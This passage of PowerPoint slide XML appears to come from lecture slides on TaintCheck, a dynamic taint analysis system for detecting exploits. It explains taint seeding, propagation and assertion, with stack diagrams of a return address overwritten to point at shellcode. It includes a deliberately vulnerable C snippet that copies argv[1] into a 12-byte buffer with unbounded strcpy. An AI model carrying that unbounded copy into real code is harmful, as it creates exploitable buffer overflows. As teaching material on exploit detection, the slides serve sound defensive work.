          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>“</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" i="1" dirty="0"/>
              <a:t>Dynamic Taint Analysis for Automatic Detection, Analysis, and Signature Generation of Exploits on Commodity Software”, James Newsome and Dawn Song</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>, Network and Distributed Systems Security Symposium (NDSS), Feb 2005</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" dirty="0"/>
            </a:br>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="32879541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TaintCheck</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>: Basic Ideas</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Mark all input data to the computer as “tainted” (e.g., network, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>stdin</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>, etc.)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Monitor program execution and track how tainted data propagates (follow bytes, arithmetic operations, etc.)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Detect when tainted data is used in dangerous ways (e.g., jump to tainted data)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="33353924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TaintSeed</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Marks any data from untrusted sources as “tainted”</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Shadow memory is used to mark whether a byte in the memory is tainted or not. </a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="TextBox 4"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="498165" y="3748025"/>
            <a:ext cx="2602338" cy="2677656"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0" err="1">
                <a:latin typeface="Segoe UI Semibold" pitchFamily="34" charset="0"/>
                <a:ea typeface="Verdana" pitchFamily="34" charset="0"/>
                <a:cs typeface="Verdana" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>int</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:latin typeface="Segoe UI Semibold" pitchFamily="34" charset="0"/>
                <a:ea typeface="Verdana" pitchFamily="34" charset="0"/>
                <a:cs typeface="Verdana" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t> main (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0" err="1">
                <a:latin typeface="Segoe UI Semibold" pitchFamily="34" charset="0"/>
                <a:ea typeface="Verdana" pitchFamily="34" charset="0"/>
                <a:cs typeface="Verdana" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>int</a:t>
            </a:r>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argc</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:latin typeface="Segoe UI Semibold" pitchFamily="34" charset="0"/>
                <a:ea typeface="Verdana" pitchFamily="34" charset="0"/>
                <a:cs typeface="Verdana" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>, char **</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0" err="1">
                <a:latin typeface="Segoe UI Semibold" pitchFamily="34" charset="0"/>
                <a:ea typeface="Verdana" pitchFamily="34" charset="0"/>
                <a:cs typeface="Verdana" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>argv</a:t>
            </a:r>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printf</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:latin typeface="Segoe UI Semibold" pitchFamily="34" charset="0"/>
                <a:ea typeface="Verdana" pitchFamily="34" charset="0"/>
                <a:cs typeface="Verdana" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>(“%s”, “CEG”);</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:latin typeface="Segoe UI Semibold" pitchFamily="34" charset="0"/>
                <a:ea typeface="Verdana" pitchFamily="34" charset="0"/>
                <a:cs typeface="Verdana" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>   foo(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0" err="1">
                <a:latin typeface="Segoe UI Semibold" pitchFamily="34" charset="0"/>
                <a:ea typeface="Verdana" pitchFamily="34" charset="0"/>
                <a:cs typeface="Verdana" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>argv</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:latin typeface="Segoe UI Semibold" pitchFamily="34" charset="0"/>
                <a:ea typeface="Verdana" pitchFamily="34" charset="0"/>
                <a:cs typeface="Verdana" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>[1]);</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printf</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:latin typeface="Segoe UI Semibold" pitchFamily="34" charset="0"/>
                <a:ea typeface="Verdana" pitchFamily="34" charset="0"/>
                <a:cs typeface="Verdana" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>(“%s”, “7900”)</a:t>
            </a:r>
          </a:p>
          <a:p>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void foo (char *bar)</a:t>
            </a:r>
          </a:p>
          <a:p>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   char c[12];</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strcpy</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:latin typeface="Segoe UI Semibold" pitchFamily="34" charset="0"/>
                <a:ea typeface="Verdana" pitchFamily="34" charset="0"/>
                <a:cs typeface="Verdana" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t> (c, bar); //no bound</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:latin typeface="Segoe UI Semibold" pitchFamily="34" charset="0"/>
                <a:ea typeface="Verdana" pitchFamily="34" charset="0"/>
                <a:cs typeface="Verdana" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>}</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0">
              <a:latin typeface="Segoe UI Semibold" pitchFamily="34" charset="0"/>
              <a:ea typeface="Verdana" pitchFamily="34" charset="0"/>
              <a:cs typeface="Verdana" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="TextBox 5"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="498165" y="6276363"/>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“abcdef87654”</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Rectangle 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4424351" y="4533312"/>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a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Rectangle 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4426546" y="4863227"/>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b</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Rectangle 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4424351" y="5975963"/>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/0</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Rectangle 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6333667" y="4533312"/>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11" name="Rectangle 10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6335862" y="4863227"/>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12" name="Rectangle 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6333667" y="5975963"/>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13" name="TextBox 12"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4424351" y="3943634"/>
            <a:ext cx="1119017"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Memory</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="TextBox 13"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5794277" y="3956955"/>
            <a:ext cx="220779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Shadow Memory</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="35935441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TaintTracker</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="92500"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Tracks each instruction that manipulates data in order to determine whether the result is tainted.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Data movement instructions</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>LOAD, STORE, MOVE, PUSH, POP, and etc.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Rule: if any byte of data at the source location is tainted, the data at the destination will be tainted</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Arithmetic instructions</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>ADD, SUB, XOR, and etc.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Rule: the result will be tainted if any byte of the operands is tainted</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="19574093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TaintTracker</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>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2376095"/>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295666"/>
            <a:ext cx="2709959" cy="2017598"/>
            <a:chOff x="5942683" y="1915323"/>
            <a:chExt cx="1115262" cy="2017598"/>
          </a:xfrm>
          <a:solidFill>
            <a:srgbClr val="FAC090"/>
          </a:solidFill>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="17" name="TextBox 16"/>
            <p:cNvSpPr txBox="1"/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="5942684" y="2503309"/>
              <a:ext cx="1115261"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716591" y="3409309"/>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b="1"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131064" y="3409309"/>
            <a:ext cx="515398" cy="338554"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0"/>
              <a:t>foo:</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="38"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39"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sp>
        <p:nvSpPr>
          <p:cNvPr id="47"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58" name="Right Brace 57"/>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65" name="Group 64"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="7411305" y="5660532"/>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279" y="503280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Previous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7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40" name="TextBox 39"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5509330" y="1417638"/>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“0xFF223……..”</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Rectangle 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5935287" y="2065175"/>
            <a:ext cx="1379913" cy="2738315"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FF0000">
              <a:alpha val="49000"/>
            </a:srgb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6" name="Rectangle 45"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4885343" y="2007592"/>
            <a:ext cx="925253" cy="369332"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>0xABCD</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="6" name="Group 5"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="5974138" y="2099218"/>
            <a:ext cx="1274560" cy="2671019"/>
            <a:chOff x="5974138" y="2099218"/>
            <a:chExt cx="1274560" cy="2671019"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="4" name="Rectangle 3"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="5979740" y="2099218"/>
              <a:ext cx="1268958" cy="2313797"/>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Malicious</a:t>
              </a:r>
            </a:p>
            <a:p>
              <a:pPr algn="ctr"/>
              <a:r>
                <a:rPr lang="en-US" sz="1600" dirty="0"/>
                <a:t>Instructions</a:t>
              </a:r>
            </a:p>
            <a:p>
              <a:pPr algn="ctr"/>
              <a:r>
                <a:rPr lang="en-US" sz="1600" dirty="0"/>
                <a:t>(</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" sz="1600" dirty="0" err="1"/>
                <a:t>shellcode</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" sz="1600" dirty="0"/>
                <a:t>)</a:t>
              </a:r>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="49" name="Rectangle 48"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="5974138" y="4472244"/>
              <a:ext cx="1268958" cy="297993"/>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0xABCD</a:t>
              </a:r>
            </a:p>
          </p:txBody>
        </p:sp>
      </p:grpSp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Slide Number Placeholder 6"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="12"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{4F16CFC1-D6E9-5244-A559-738FECFB22C9}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>79</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="32" name="Rectangle 31"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1299704" y="5409345"/>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0xF</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="33" name="Rectangle 32"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1301899" y="5739260"/>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0xF</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="34" name="Rectangle 33"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1299704" y="6524276"/>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/0</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="35" name="Rectangle 34"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2743198" y="5409345"/>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36" name="Rectangle 35"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2745393" y="5739260"/>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37" name="Rectangle 36"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2743198" y="6496966"/>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41" name="TextBox 40"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="72153" y="6156295"/>
            <a:ext cx="1119017"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Memory</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="42" name="TextBox 41"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3960724" y="6156295"/>
            <a:ext cx="220779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Shadow Memory</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="43" name="Rectangle 42"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7709159" y="2055862"/>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44" name="Rectangle 43"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7711354" y="2385777"/>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45" name="Rectangle 44"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7709159" y="3143483"/>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48" name="Rectangle 47"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7709159" y="4145059"/>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51" name="Rectangle 50"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7697699" y="4495828"/>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52" name="Rectangle 51"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7711354" y="4852180"/>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NULL</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="53" name="Rectangle 52"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7697699" y="5660532"/>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NULL</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="25616029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TaintAssert</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Checks whether tainted data is used in ways that its policy defines as illegitimate</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Jump addresses: whether the tainted data is used as a jump target (e.g., a return address)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Format strings (format string attacks)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>System call arguments (for certain system calls such as </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>execve</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="7870489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TaintAssert</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>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2376095"/>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295666"/>
            <a:ext cx="2709959" cy="2017598"/>
            <a:chOff x="5942683" y="1915323"/>
            <a:chExt cx="1115262" cy="2017598"/>
          </a:xfrm>
          <a:solidFill>
            <a:srgbClr val="FAC090"/>
          </a:solidFill>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="17" name="TextBox 16"/>
            <p:cNvSpPr txBox="1"/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="5942684" y="2503309"/>
              <a:ext cx="1115261"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716591" y="3409309"/>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b="1" dirty="0"/>
              <a:t>ret</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="21" name="Rectangle 20"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1131064" y="3409309"/>
            <a:ext cx="515398" cy="338554"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0"/>
              <a:t>foo:</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="38"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39"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sp>
        <p:nvSpPr>
          <p:cNvPr id="47"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58" name="Right Brace 57"/>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65" name="Group 64"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="7411305" y="5660532"/>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279" y="503280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Previous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7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40" name="TextBox 39"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5509330" y="1417638"/>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“0xFF223……..”</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Rectangle 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5935287" y="2065175"/>
            <a:ext cx="1379913" cy="2738315"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FF0000">
              <a:alpha val="49000"/>
            </a:srgb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6" name="Rectangle 45"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4885343" y="2007592"/>
            <a:ext cx="925253" cy="369332"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>0xABCD</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="6" name="Group 5"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="5974138" y="2099218"/>
            <a:ext cx="1274560" cy="2671019"/>
            <a:chOff x="5974138" y="2099218"/>
            <a:chExt cx="1274560" cy="2671019"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="4" name="Rectangle 3"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="5979740" y="2099218"/>
              <a:ext cx="1268958" cy="2313797"/>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Malicious</a:t>
              </a:r>
            </a:p>
            <a:p>
              <a:pPr algn="ctr"/>
              <a:r>
                <a:rPr lang="en-US" sz="1600" dirty="0"/>
                <a:t>Instructions</a:t>
              </a:r>
            </a:p>
            <a:p>
              <a:pPr algn="ctr"/>
              <a:r>
                <a:rPr lang="en-US" sz="1600" dirty="0"/>
                <a:t>(</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" sz="1600" dirty="0" err="1"/>
                <a:t>shellcode</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" sz="1600" dirty="0"/>
                <a:t>)</a:t>
              </a:r>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
